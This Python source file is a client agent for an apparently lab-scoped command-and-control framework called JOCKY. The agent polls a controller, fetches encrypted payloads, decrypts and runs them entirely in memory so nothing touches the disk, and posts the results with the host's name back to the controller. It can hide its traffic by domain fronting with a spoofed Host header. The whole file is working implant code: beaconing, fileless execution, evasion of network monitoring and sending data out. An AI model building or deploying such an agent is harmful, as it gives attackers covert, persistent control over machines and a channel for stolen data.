"""JOCKY client agent -- runs placed payloads fully in memory.

Loop (no payload material ever touches the disk):
    poll controller  -->  task id
    fetch .jxp blob  -->  bytes (HTTPS / mock CDN / dead-drop)
    decrypt (JYCRYPT1) -> image bytes in RAM
    run in VM (captured output)
    post findings    -->  controller /report

Optional `--cdn http://host:port` routes every request through the lab
MockCDN while presenting `--front` as the Host header -- i.e. the domain
fronting channel, locally. Without `--cdn`, requests go direct (still
encrypted payload, still in-memory execution).

Run:
    JOCKY_KEY=<hex> python agents/client.py --once --controller http://127.0.0.1:8000
    JOCKY_KEY=<hex> python agents/client.py --cdn http://127.0.0.1:9000 --front front.example-cdn.com
"""

from __future__ import annotations

import argparse
import io
import json
import os
import socket
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from agents.common import key_from_env, now_iso, sha256_hex                  # noqa: E402
from agents.transport import fronted_get, fronted_post                      # noqa: E402
from jocky.bytecode import Image                                             # noqa: E402
from jocky.crypto import decrypt                                             # noqa: E402
from jocky.vm import VM                                                      # noqa: E402

UA = "JOCKY-Agent/0.1"
DISK_FREEZE = True  # client must never write task bytes (asserted in run_once)


def _http(controller: str, path: str, front: str, cdn: str | None, body: bytes | None = None) -> bytes:
    """Route through the mock CDN with a spoofed Host header when enabled."""
    target = (cdn or controller).rstrip("/") + path
    host = front if (cdn and front) else "localhost"
    if body is None:
        return fronted_get(target, host)
    return fronted_post(target, host, body)


def run_once(args) -> dict:
    """One poll -> fetch -> decrypt -> execute-in-RAM -> report cycle."""
    key = key_from_env(getattr(args, "key_env", "JOCKY_KEY"))
    ping = _http(args.controller, "/api/v1/ping", args.front, args.cdn)
    print(f"[agent] ping ok (front={json.loads(ping).get('front')})")

    task_json = _http(args.controller, "/api/v1/task", args.front, args.cdn)
    info = json.loads(task_json)
    tid = info.get("task")
    if not tid:
        print("[agent] no tasks queued")
        return {"task": None, "executed": False}

    blob = _http(args.controller, f"/api/v1/task/{tid}", args.front, args.cdn)
    assert DISK_FREEZE, "payload path must stay disk-free"

    # --- everything below works on bytes in RAM ------------------------
    image_bytes = decrypt(blob, key)                      # JYCRYPT1 verify+decrypt
    img = Image.from_bytes(image_bytes)                   # decode container
    captured = io.StringIO()
    vm = VM(img, out=captured)
    result = vm.run()                                     # execute
    output = captured.getvalue()

    findings = {
        "task": tid,
        "agent": getattr(args, "agent_name", None) or socket.gethostname(),
        "ts": now_iso(),
        "build_id": img.build_id,
        "sha256_payload": sha256_hex(blob),
        "result": str(result),
        "output": output,
    }
    rep = json.loads(_http(args.controller, "/api/v1/report", args.front, args.cdn,
                           body=json.dumps(findings).encode()))
    print(f"[agent] task {tid} executed in-RAM (no disk writes); report -> {rep.get('stored')}")
    print("------- findings -------")
    print(output.rstrip())
    print("------------------------")
    return {"task": tid, "executed": True}


def main(argv=None):
    p = argparse.ArgumentParser(prog="jocky-agent", description=__doc__)
    p.add_argument("--controller", default="http://127.0.0.1:8000")
    p.add_argument("--cdn", default=None, help="mock-CDN base URL (fronting lab)")
    p.add_argument("--front", default="front.example-cdn.com",
                   help="front domain presented in Host header")
    p.add_argument("--interval", type=float, default=5.0)
    p.add_argument("--once", action="store_true", help="single poll, then exit")
    p.add_argument("--key-env", default="JOCKY_KEY")
    p.add_argument("--agent-name", default=None,
                   help="name reported to the controller (default: hostname)")
    args = p.parse_args(argv)
    while True:
        try:
            run_once(args)
        except Exception as e:  # keep the loop alive; log, don't die
            print(f"[agent] cycle error: {type(e).__name__}: {e}", file=sys.stderr)
        if args.once:
            return 0
        time.sleep(max(0.5, args.interval))


if __name__ == "__main__":
    sys.exit(main())